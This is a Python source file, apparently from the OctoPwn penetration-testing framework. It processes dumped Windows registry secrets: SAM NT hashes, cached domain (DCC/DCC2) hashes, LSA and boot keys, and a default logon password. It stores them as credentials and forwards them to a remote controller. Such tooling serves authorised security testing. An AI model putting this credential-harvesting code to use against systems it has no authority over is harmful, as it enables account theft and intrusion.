


import traceback
from octopwn.common.credential import Credential
from octopwn.remote.protocol.python import secrets_pb2


async def store_registry_creds(mainobj, po, to_print = True, h_token = None):
	try:
		if po.sam is not None:
			for x in po.sam.secrets:
				if x.nt_hash is None:
					continue
				nt_hash = x.nt_hash.hex()
				if nt_hash != '31d6cfe0d16ae931b73c59d7e0c089c0':
					cred = Credential(x.username, nt_hash, 'NT', source='SMBREG-SAM-%s' % mainobj.client_id, description='SMBREG-SAM')
					_, err = await mainobj.octopwnobj.addcredential_obj(cred)
					if err is not None and to_print is True:
						await mainobj.print('Failed to add reg credential for user %s Reason: %s' % (x.username, err))
			
		if po.security is not None:
			for x in po.security.dcc_hashes:
				cred = Credential(
					x.username, 
					x.to_lopth(), 
					'DCC' if x.version == 1 else 'DCC2', 
					domain=x.domain, 
					source='SMBREG-DCC-%s' % mainobj.client_id, 
					description='SMBREG'
				)
				_, err = await mainobj.octopwnobj.addcredential_obj(cred)
				if err is not None and to_print is True:
					await mainobj.print('Failed to add reg credential for user %s Reason: %s' % (x.username, err))

		if to_print is True:
			res = str(po)
			for line in res.split('\r\n'):
				await mainobj.print(line)
		if h_token is not None:		
			msg = secrets_pb2.RegistrySecret()
			msg.bootkey = po.security.bootkey
			if po.sam is not None:
				saw = secrets_pb2.SAMSecret()
				saw.machineSid = po.sam.machine_sid
				for x in po.sam.secrets:
					sw = secrets_pb2.SAMUserSecret()
					sw.userName = x.username
					sw.userRid = x.rid
					sw.ntHash = x.nt_hash
					sw.lmHash = x.lm_hash
					saw.userSecret.extend([sw])
				msg.samSecret.copyFrom(saw)
			if po.security is not None:
				sew = secrets_pb2.SECURITYSecret()
				sew.dccIterCount = po.security.dcc_iteration_count
				sew.lsaKey = po.security.lsa_key
				sew.nklmKey = po.security.NKLM_key
				for x in po.security.dcc_hashes:
					sw = secrets_pb2.LSADCCSecret()
					sw.version = x.version
					sw.domain = x.domain
					sw.userName = x.username
					sw.iteration = x.iteration
					sw.hash = x.hash_value
					sw.fullhash = x.to_lopth()
					sew.lsaDccSecrets.extend([sw])
				# TODO: add this!
				#for x in po.security.cached_secrets:
				#	sw = LSASecret()
				#	sw.version = x.version
				#	sw.domain = x.domain
				#	sw.userName = x.username
				#	sw.iteration = x.iteration
				#	sw.hash = x.hash_value
				#	sw.fullhash = x.to_lopth()
				#	sew.lsaSecrets.extend([sw])
				msg.securitySecret.copyFrom(sew)
			if po.software is not None:
				sow = secrets_pb2.SOFTWARESecret()
				sow.defaultLogonUser = po.software.default_logon_user
				sow.defaultLogonDomain = po.software.default_logon_domain
				sow.defaultLogonPassword = po.software.default_logon_password
			
			await mainobj.remotemsg(msg)
	except Exception as e:
		traceback.print_exc()